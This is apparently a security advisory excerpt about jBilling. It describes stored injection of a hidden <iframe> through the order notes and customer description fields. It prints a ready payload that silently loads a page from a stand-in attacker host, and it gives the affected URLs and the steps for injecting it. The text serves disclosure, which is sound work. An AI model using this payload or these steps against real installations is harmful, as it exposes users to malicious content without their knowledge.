DESCRIPTION OF VULNERABILITIES

Cross Site Request Forgery (CSRF)
jBilling does not properly check user input, thus allowing the <iframe> tag to be used in a malicious manner. For example, an individual with Add User rights could add multiple users and when those users log in, the following <iframe> tag would send them to a malicious website hosting malicious content:

<iframe src=”http://attacker_host:4321/attack.html” height=”1” width=”1” style=”visibility: hidden;” />

The URLs that are affected are:

http://[host]/jbilling/orderBuilder/edit?execution=e1s1&userId=[uid]

	Create a new order and in the notes section, input your malicious code.

http://[host]/jbilling/customer/edit

	 Add a new customer by going to the URL above and enter their details. In the description box, input your malicious code.
